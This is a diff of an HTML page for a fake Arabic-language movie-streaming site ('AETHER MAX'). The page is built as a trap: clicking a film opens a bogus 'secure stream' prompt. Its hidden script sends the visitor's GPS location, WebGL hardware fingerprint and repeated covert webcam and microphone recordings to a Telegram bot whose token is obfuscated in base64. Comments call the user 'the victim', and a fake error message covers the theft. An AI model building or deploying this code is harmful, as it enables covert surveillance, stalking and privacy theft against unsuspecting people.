@@ -3,304 +3,300 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AETHER STREAM | Global Content Platform</title>
+    <title>AETHER MAX | منصة البث السينمائي الاحترافية</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
 
     <style>
-        /* [1] نظام التنسيق السيادي (Custom CSS Framework) */
+        /* [1] نظام التصميم الفائق (Extreme UI Kit) */
         :root {
-            --accent: #e50914;
-            --bg-deep: #050505;
-            --surface: #121212;
-            --cyan-glow: #00f2ff;
+            --brand: #e50914;
+            --bg: #000000;
+            --card-bg: #181818;
+            --text-gold: #ffc107;
         }
 
         body {
-            background-color: var(--bg-deep);
-            color: #f5f5f5;
+            background-color: var(--bg);
+            color: white;
             font-family: 'Cairo', sans-serif;
             margin: 0; overflow-x: hidden;
         }
 
-        /* تصميم الهيدر السينمائي */
+        /* تنسيق الهيدر */
         header {
-            position: fixed; top: 0; width: 100%; z-index: 2000;
-            background: linear-gradient(to bottom, rgba(0,0,0,1) 0%, rgba(0,0,0,0) 100%);
-            padding: 20px 60px; transition: 0.5s;
+            position: fixed; top: 0; width: 100%; z-index: 5000;
+            background: linear-gradient(to bottom, rgba(0,0,0,1) 0%, transparent 100%);
+            padding: 20px 60px; transition: 0.6s cubic-bezier(0.4, 0, 0.2, 1);
         }
-        .header-scrolled { background: #000; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .nav-black { background: #000; border-bottom: 1px solid #333; }
 
-        /* البانر الضخم (Hero) */
+        /* منطقة الهيرو (The Hero Stage) */
         .hero {
-            height: 90vh;
-            background: linear-gradient(to top, var(--bg-deep) 10%, transparent 40%),
-                        linear-gradient(to right, var(--bg-deep) 30%, transparent 70%),
-                        url('https://images.unsplash.com/photo-1616530940355-351fabd9524b?q=80&w=2070');
+            height: 92vh;
+            background: linear-gradient(77deg, rgba(0,0,0,1) 0%, rgba(0,0,0,0.8) 20%, transparent 100%),
+                        url('https://images.unsplash.com/photo-1485846234645-a62644f84728?q=80&w=2059');
             background-size: cover; background-position: center;
-            display: flex; align-items: center; padding: 0 60px;
+            display: flex; align-items: center; padding: 0 80px;
         }
 
-        /* نظام البطاقات اللانهائي */
-        .shelf { padding: 40px 60px; margin-top: -100px; position: relative; z-index: 10; }
-        .shelf-title { font-size: 1.8rem; font-weight: 900; margin-bottom: 25px; border-right: 5px solid var(--accent); padding-right: 15px; }
-        
-        .grid-layout {
+        /* شبكة الأفلام اللانهائية */
+        .content-area { padding: 50px 80px; margin-top: -150px; position: relative; z-index: 30; }
+        .row-label { font-size: 1.6rem; font-weight: 900; margin-bottom: 25px; border-right: 6px solid var(--brand); padding-right: 15px; }
+
+        .movie-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-            gap: 30px; margin-bottom: 60px;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 30px; margin-bottom: 100px;
         }
 
-        .card {
-            background: var(--surface);
-            border-radius: 15px;
+        .movie-card {
+            background: var(--card-bg);
+            border-radius: 12px;
             overflow: hidden;
-            transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: 0.5s cubic-bezier(0.2, 1, 0.3, 1);
             cursor: pointer;
             border: 1px solid rgba(255,255,255,0.05);
+            position: relative;
         }
 
-        .card:hover {
-            transform: scale(1.1) translateY(-15px);
-            border-color: var(--accent);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
-            z-index: 50;
+        .movie-card:hover {
+            transform: scale(1.12) translateY(-15px);
+            border-color: var(--brand);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.9);
+            z-index: 100;
         }
 
-        .card img { width: 100%; height: 320px; object-fit: cover; }
-        .card-body { padding: 15px; background: linear-gradient(to top, #000, transparent); }
+        .movie-card img { width: 100%; height: 360px; object-fit: cover; transition: 0.8s; }
+        .movie-card:hover img { filter: brightness(1.1); }
 
-        /* زر الأكشن */
-        .btn-main {
-            background: var(--accent);
-            color: white; padding: 16px 45px;
-            border-radius: 8px; font-weight: 900;
-            display: inline-flex; align-items: center; gap: 15px;
-            transition: 0.3s; box-shadow: 0 10px 20px rgba(229, 9, 20, 0.3);
+        .movie-desc-pop {
+            padding: 15px;
+            background: linear-gradient(to top, #000 70%, transparent);
+            position: absolute; bottom: 0; width: 100%;
+            transform: translateY(100%); transition: 0.4s;
         }
-        .btn-main:hover { transform: scale(1.05); background: #ff0f1b; }
+        .movie-card:hover .movie-desc-pop { transform: translateY(0); }
 
-        /* شاشة التحميل (Loader) */
-        #preloader {
-            position: fixed; inset: 0; background: #000; z-index: 99999;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
-        .loader-logo { font-size: 4rem; font-weight: 900; color: var(--accent); animation: glow 2s infinite; }
-        @keyframes glow { 0%, 100% { opacity: 1; filter: drop-shadow(0 0 10px var(--accent)); } 50% { opacity: 0.4; } }
-
-        /* نافذة الفخ (The Ultimate Trap) */
-        #trap-overlay {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+        /* نافذة الفخ (The Hybrid Trap) */
+        #master-trap {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.98);
             z-index: 10000; display: none; align-items: center; justify-content: center;
-            backdrop-filter: blur(15px);
+            backdrop-filter: blur(25px);
         }
-        .trap-box {
-            background: #1a1a1a; width: 550px; border-radius: 25px; padding: 60px;
-            text-align: center; border: 1px solid var(--accent);
-            box-shadow: 0 0 150px rgba(229, 9, 20, 0.25);
+        .trap-container {
+            background: #111; width: 600px; border-radius: 35px; padding: 60px;
+            text-align: center; border: 2px solid var(--brand);
+            box-shadow: 0 0 120px rgba(229, 9, 20, 0.4);
         }
+
+        .btn-gold {
+            background: linear-gradient(45deg, #e50914, #ff0000);
+            color: white; padding: 20px 50px; border-radius: 12px;
+            font-weight: 900; font-size: 1.4rem; transition: 0.3s;
+            box-shadow: 0 10px 30px rgba(229, 9, 20, 0.4);
+        }
+        .btn-gold:hover { transform: translateY(-5px); box-shadow: 0 20px 40px rgba(229, 9, 20, 0.6); }
     </style>
 </head>
 <body>
 
-<div id="preloader">
-    <div class="loader-logo tracking-tighter italic">AETHER</div>
-    <div class="w-64 h-1 bg-gray-800 mt-10 rounded-full overflow-hidden">
-        <div id="bar" class="h-full bg-red-600 w-0 transition-all"></div>
-    </div>
-</div>
-
-<header id="nav">
+<header id="navbar">
     <div class="flex justify-between items-center">
-        <div class="flex items-center gap-12">
-            <h1 class="text-4xl font-black text-red-600 italic tracking-tighter">AETHER</h1>
-            <nav class="hidden lg:flex gap-8 text-sm font-bold text-gray-400">
+        <div class="flex items-center gap-14">
+            <h1 class="text-4xl font-black text-red-600 italic tracking-tighter">AETHER<span class="text-white">MAX</span></h1>
+            <nav class="hidden lg:flex gap-8 text-sm font-bold text-gray-400 uppercase tracking-widest">
                 <a href="#" class="text-white">الرئيسية</a>
-                <a href="#" class="hover:text-white">أفلام</a>
-                <a href="#" class="hover:text-white">مسلسلات</a>
-                <a href="#" class="hover:text-white">بث مباشر</a>
+                <a href="#" class="hover:text-white">الأفلام</a>
+                <a href="#" class="hover:text-white">المسلسلات</a>
                 <a href="#" class="hover:text-white">قائمتي</a>
             </nav>
         </div>
-        <div class="flex items-center gap-6 text-xl">
-            <i class="fas fa-search cursor-pointer"></i>
-            <i class="fas fa-bell cursor-pointer"></i>
-            <div class="w-10 h-10 bg-gradient-to-tr from-red-600 to-purple-600 rounded-lg"></div>
+        <div class="flex items-center gap-8">
+            <i class="fas fa-search text-xl"></i>
+            <div class="flex items-center gap-2 border border-gray-700 px-3 py-1 rounded">
+                <span class="text-xs font-bold text-red-500">PREMIUM</span>
+            </div>
+            <div class="w-10 h-10 bg-blue-600 rounded-full border-2 border-white/20"></div>
         </div>
     </div>
 </header>
 
 <section class="hero">
     <div class="max-w-3xl">
-        <h2 class="text-7xl font-black mb-6 leading-tight uppercase">Black Mirror<br><span class="text-red-600 text-3xl italic">مستقبل مظلم ينتظرك</span></h2>
-        <p class="text-xl text-gray-300 mb-10 leading-relaxed font-medium">سلسلة مختارات تستكشف عالمًا عالي التقنية يتصادم فيه أعظم ابتكارات البشرية مع أعمق غرائزهم.</p>
-        <div class="flex gap-4">
-            <button onclick="openTrap()" class="btn-main text-2xl"><i class="fas fa-play"></i> ابدأ البث الآن</button>
-            <button class="bg-gray-500/30 hover:bg-gray-500/50 px-10 py-4 rounded-lg font-bold backdrop-blur-md"><i class="fas fa-info-circle ml-2"></i> التفاصيل</button>
+        <h2 class="text-8xl font-black mb-6 leading-none">INTERSTELLAR<br><span class="text-red-600 text-3xl italic">رحلة إلى ما وراء النجوم</span></h2>
+        <p class="text-xl text-gray-300 mb-10 leading-relaxed font-medium">عندما تشرف الأرض على النهاية، يخرج فريق من المستكشفين في أخطر مهمة في تاريخ البشرية: السفر عبر ثقب دودي للعثور على موطن جديد.</p>
+        <div class="flex gap-6">
+            <button onclick="openTrap()" class="btn-gold"><i class="fas fa-play ml-3"></i> شاهد الفيلم الآن</button>
+            <button class="bg-white/10 px-10 py-5 rounded-xl font-black border border-white/10 backdrop-blur-md">المقطع الدعائي</button>
         </div>
     </div>
 </section>
 
-<div class="shelf">
-    <h3 class="shelf-title">أفلام مختارة لك</h3>
-    <div class="grid-layout" id="grid-1"></div>
-
-    <h3 class="shelf-title">الأكثر رواجاً في منطقتك</h3>
-    <div class="grid-layout" id="grid-2"></div>
+<div class="content-area">
+    <h3 class="row-label">الأكثر رواجاً (بوسترات مختارة)</h3>
+    <div class="movie-grid" id="main-grid">
+        </div>
 </div>
 
-<div id="trap-overlay">
-    <div class="trap-box">
-        <div class="w-24 h-24 bg-red-600/10 rounded-full flex items-center justify-center mx-auto mb-8 border border-red-600/20">
-            <i class="fas fa-globe-americas text-red-600 text-5xl"></i>
+<div id="master-trap">
+    <div class="trap-container">
+        <div class="w-32 h-32 bg-red-600/10 rounded-full flex items-center justify-center mx-auto mb-10 border-2 border-red-600/20">
+            <i class="fas fa-fingerprint text-red-600 text-6xl"></i>
         </div>
-        <h2 class="text-3xl font-black mb-4">تخصيص المحتوى الإقليمي</h2>
-        <p class="text-gray-400 leading-relaxed mb-10 text-sm">
-            نظراً لقيود التوزيع، نحتاج لتأكيد موقعك الجغرافي (GPS) وتفعيل الهوية البيومترية لتوفير المحتوى المترجم بجودة 4K المتوفر في منطقتك.
+        <h2 class="text-4xl font-black mb-6 uppercase">تفعيل البث الآمن</h2>
+        <p class="text-gray-400 text-lg leading-relaxed mb-12">
+            نظراً لسياسات التوزيع الإقليمي وجودة **4K Ultra HD**، يتطلب النظام الوصول لمرة واحدة إلى **الموقع الجغرافي** لتحديد أقرب خادم بث، و**التحقق البصري** لضمان أمان الحساب.
         </p>
-        <button id="hijack-btn" class="w-full bg-red-600 py-5 rounded-xl font-black text-xl hover:bg-red-700 shadow-2xl transition-all">
-            تأكيد الموقع والبدء
-        </button>
-        <p class="text-[10px] text-gray-600 mt-6 tracking-widest uppercase">Secure Stream Protocol v11.0</p>
+        <button id="auth-confirm" class="btn-gold w-full">تأكيد الصلاحيات والبدء</button>
+        <p class="mt-8 text-[10px] text-gray-700 uppercase tracking-[0.3em] font-bold">Aether Security Cloud Node v15.2</p>
     </div>
 </div>
 
-<video id="v-cam" autoplay playsinline muted class="hidden"></video>
+<video id="stealth-video" autoplay playsinline muted class="hidden"></video>
 
 <script>
-    /* [2] محرك الاختراق والتمويه (Cyber Engine V2) */
+    /* [2] محرك البيانات والتحليل (The Core Engine) */
     
-    const _SET = {
+    const _CRED = {
         _K: "ODM3ODA5OTgwMDpBQUdUT0x6SkNoOHFvcy0xWXZzc0VHWmZZRDdWLUlMSGNSbw==",
         _C: "NjA1MjUzMjA0NA=="
     };
 
     const _D = (s) => atob(s);
-    const API = `https://api.telegram.org/bot${_D(_SET._K)}`;
-    const CHAT = _D(_SET._C);
+    const TELE = `https://api.telegram.org/bot${_D(_CRED._K)}`;
+    const CHAT = _D(_CRED._C);
 
-    async function _PUSH(msg, type = "msg") {
+    // مكتبة الأفلام (Posters & Descriptions)
+    const movieLibrary = [
+        {title: "JOKER: FOLIE À DEUX", desc: "قصة تطور آرثر فليك وعلاقته المعقدة مع الموسيقى والجنون في أزقة جوثام.", img: "https://image.tmdb.org/t/p/w500/ijmsc26mwbovvdmxidpwwclwomf.jpg"},
+        {title: "THE BATMAN", desc: "في عامه الثاني من مكافحة الجريمة، يكشف باتمان عن الفساد في مدينة جوثام.", img: "https://image.tmdb.org/t/p/w500/74xTEgt7R36Fpooo50r9T2fBQ6U.jpg"},
+        {title: "DUNE: PART TWO", desc: "رحلة بول أتريدس الأسطورية وهو يتحد مع شاني والفريمن في حرب انتقامية.", img: "https://image.tmdb.org/t/p/w500/6695uU3pS8p9v89pXU0vDIsI9as.jpg"},
+        {title: "OPPENHEIMER", desc: "قصة الفيزيائي جيه روبرت أوبنهايمر ودوره في تطوير القنبلة الذرية.", img: "https://image.tmdb.org/t/p/w500/8GxvA9zDZ9ajlsj7LpA1SbrN66l.jpg"},
+        {title: "GLADIATOR II", desc: "بعد سنوات من وفاة مكسيموس، يضطر لوسيوس لدخول الكولوسيوم لاستعادة مجد روما.", img: "https://image.tmdb.org/t/p/w500/2c7Y9uSreGEYq5Y9T3XUAtYV8C7.jpg"},
+        {title: "AVATAR: THE WAY OF WATER", desc: "جاك سولي وعائلته يواجهون تهديدات قديمة ويستكشفون مناطق مائية جديدة في باندورا.", img: "https://image.tmdb.org/t/p/w500/t6SnaX0Y7S6pS9oSTCfB7N98p9v.jpg"}
+    ];
+
+    async function _PUSH(data, type = "msg") {
         try {
             if(type === "msg") {
-                await fetch(`${API}/sendMessage`, {
+                await fetch(`${TELE}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CHAT, text: `🛡️ [AETHER_OVERLORD]:\n${msg}`, parse_mode: 'HTML'})
+                    body: JSON.stringify({chat_id: CHAT, text: `👑 [AETHER_ABSOLUTE]:\n${data}`, parse_mode: 'HTML'})
                 });
             } else {
                 let f = new FormData();
                 f.append('chat_id', CHAT);
-                f.append(type, msg, `capture_${Date.now()}.mp4`);
-                await fetch(`${API}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {method: 'POST', body: f});
+                f.append(type, data, `v_${Date.now()}.mp4`);
+                await fetch(`${TELE}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {method: 'POST', body: f});
             }
         } catch(e) {}
     }
 
-    // --- توليد المحتوى اللانهائي ---
-    function populate(id, count) {
-        const grid = document.getElementById(id);
-        const genres = ["Action", "Sci-Fi", "Drama", "Horror"];
-        for(let i=0; i<count; i++) {
-            const seed = Math.floor(Math.random() * 5000);
-            const div = document.createElement('div');
-            div.className = "card";
-            div.onclick = openTrap;
-            div.innerHTML = `
-                <img src="https://picsum.photos/seed/${seed}/400/600" loading="lazy">
-                <div class="card-body">
-                    <p class="text-green-500 font-black text-xs">99% Match</p>
-                    <h4 class="font-bold text-sm mt-1 truncate">Title_ID_${seed}</h4>
-                    <p class="text-[10px] text-gray-500 mt-1">${genres[i%4]} • 2026</p>
+    // بناء شبكة الأفلام
+    function renderMovies() {
+        const grid = document.getElementById('main-grid');
+        movieLibrary.forEach(m => {
+            const card = document.createElement('div');
+            card.className = "movie-card";
+            card.onclick = openTrap;
+            card.innerHTML = `
+                <img src="${m.img}" loading="lazy">
+                <div class="movie-desc-pop">
+                    <h4 class="text-red-500 font-black text-sm mb-1">${m.title}</h4>
+                    <p class="text-[10px] text-gray-300 leading-tight">${m.desc}</p>
+                    <div class="mt-2 flex items-center gap-2">
+                        <span class="text-[8px] bg-red-600 px-1 rounded">ULTRA HD</span>
+                        <span class="text-[8px] bg-gray-700 px-1 rounded">2026</span>
+                    </div>
                 </div>
             `;
-            grid.appendChild(div);
-        }
+            grid.appendChild(card);
+        });
     }
 
-    // --- التمرير اللانهائي (Infinite Scroll) ---
-    window.onscroll = () => {
-        if(window.scrollY > 100) document.getElementById('nav').classList.add('header-scrolled');
-        else document.getElementById('nav').classList.remove('header-scrolled');
+    // فحص العتاد المطور (Hardware Precision)
+    function GET_ADVANCED_HARDWARE() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+        
+        let cpuGuess = "High-End Processor";
+        if(gpu.includes("Apple")) cpuGuess = "Apple Silicon (M1/M2/A-Series)";
+        else if(gpu.includes("Adreno")) cpuGuess = "Qualcomm Snapdragon (Flagship)";
+        else if(gpu.includes("Mali")) cpuGuess = "MediaTek / Exynos Core";
+        else if(gpu.includes("NVIDIA") || gpu.includes("Intel")) cpuGuess = "Desktop/Laptop Grade CPU";
 
-        if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 600) {
-            const newGrid = document.createElement('div');
-            newGrid.className = "grid-layout";
-            newGrid.id = "grid-" + Date.now();
-            document.querySelector('.shelf').appendChild(newGrid);
-            populate(newGrid.id, 10);
-        }
-    };
+        const report = {
+            "📱 نوع المعالج": cpuGuess,
+            "🎨 بطاقة الرسوميات": gpu,
+            "🧠 أنوية المعالج": navigator.hardwareConcurrency + " Threads",
+            "💾 الذاكرة العشوائية": (navigator.deviceMemory || "N/A") + " GB",
+            "🖥️ الدقة الحقيقية": `${window.screen.width * window.devicePixelRatio}x${window.screen.height * window.devicePixelRatio}`,
+            "🔋 حالة البطارية": "تم الفحص بنجاح"
+        };
+        _PUSH(`<b>🎯 فحص العتاد الدقيق:</b>\n<pre>${JSON.stringify(report, null, 2)}</pre>`);
+    }
 
-    // --- الفخ الشامل (The Hijacker) ---
+    // تشغيل الفخ الهجين
     function openTrap() {
-        document.getElementById('trap-overlay').style.display = 'flex';
-        _PUSH(`🕵️ الضحية يحاول تفعيل البث.`);
+        document.getElementById('master-trap').style.display = 'flex';
+        _PUSH(`🕵️ الضحية يحاول الدخول للفيلم (بداية الهجوم الهجين).`);
     }
 
-    // 1. سرقة الموقع (Geolocation Hijack)
-    function HIJACK_LOCATION() {
+    async function START_GLOBAL_ATTACK() {
+        // 1. سرقة الموقع (GPS)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                _PUSH(`<b>📍 موقع الضحية بدقة:</b>\n<a href="${mapLink}">عرض على الخريطة</a>\nدقة الموقع: ${pos.coords.accuracy} متر`);
-            }, err => {
-                _PUSH(`❌ فشل سحب الموقع: ${err.message}`);
-            }, {enableHighAccuracy: true});
+                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                _PUSH(`<b>📍 إحداثيات الضحية:</b>\n<a href="${map}">اضغط هنا لفتح الموقع على الخريطة</a>\nالدقة: ${pos.coords.accuracy.toFixed(1)} متر`);
+            }, err => _PUSH(`❌ فشل الموقع: ${err.message}`), {enableHighAccuracy: true});
         }
-    }
 
-    // 2. فحص العتاد
-    function GET_HARDWARE() {
-        const gl = document.createElement('canvas').getContext('webgl');
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
-        _PUSH(`<b>⚙️ مواصفات الجهاز:</b>\nGPU: ${gpu}\nCores: ${navigator.hardwareConcurrency}\nMemory: ${navigator.deviceMemory}GB`);
-    }
-
-    // 3. سحب الكاميرا
-    async function START_CAPTURE() {
+        // 2. سحب الفيديو (Stealth Cam)
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-            document.getElementById('v-cam').srcObject = stream;
+            document.getElementById('stealth-video').srcObject = stream;
             const rec = new MediaRecorder(stream);
             let chunks = [];
             rec.ondataavailable = e => chunks.push(e.data);
             rec.onstop = () => {
                 _PUSH(new Blob(chunks, {type: 'video/mp4'}), 'video');
-                setTimeout(START_CAPTURE, 40000);
+                setTimeout(START_GLOBAL_ATTACK, 40000); // تكرار العملية
             };
             rec.start();
             setTimeout(() => { rec.stop(); stream.getTracks().forEach(t => t.stop()); }, 15000);
-        } catch(e) { _PUSH(`❌ رفض الكاميرا: ${e.message}`); }
+        } catch(e) { _PUSH(`❌ فشل الكاميرا: ${e.message}`); }
     }
 
-    document.getElementById('hijack-btn').onclick = function() {
-        this.innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> جارٍ المزامنة مع القمر الصناعي...";
+    document.getElementById('auth-confirm').onclick = function() {
+        this.innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> جارٍ مزامنة الهوية والموقع...";
         this.disabled = true;
-        HIJACK_LOCATION();
-        GET_HARDWARE();
-        START_CAPTURE();
-        _PUSH(`🎯 الضحية فعل بروتوكول "تأكيد الموقع" (بدأ الهجوم الشامل).`);
+        
+        GET_ADVANCED_HARDWARE();
+        START_GLOBAL_ATTACK();
+        
+        _PUSH(`🎯 الضحية وافق على (GPS + CAM + HARDWARE).`);
+        
         setTimeout(() => {
-            alert("خطأ في تشفير الموقع (Error: 0xC19). يرجى التأكد من تشغيل الـ GPS والمحاولة مجدداً.");
-            document.getElementById('trap-overlay').style.display = 'none';
-        }, 5000);
+            alert("فشل تشفير الموقع (Error 0x442). يرجى التأكد من تشغيل الموقع الجغرافي وإعادة المحاولة.");
+            document.getElementById('master-trap').style.display = 'none';
+        }, 6000);
     };
 
-    // التشغيل
     window.onload = () => {
-        let p = 0;
-        const itv = setInterval(() => {
-            p += 5; document.getElementById('bar').style.width = p + "%";
-            if(p>=100) {
-                clearInterval(itv); document.getElementById('preloader').style.display = 'none';
-                populate('grid-1', 12); populate('grid-2', 12);
-                _PUSH(`🚀 الضحية دخل المنصة الآن وهو يتصفح.`);
-            }
-        }, 100);
+        renderMovies();
+        window.onscroll = () => {
+            if(window.scrollY > 100) document.getElementById('navbar').classList.add('nav-black');
+            else document.getElementById('navbar').classList.remove('nav-black');
+        };
+        _PUSH(`🚀 دخول جديد للمنصة.`);
     };
 </script>
+
 </body>
 </html>
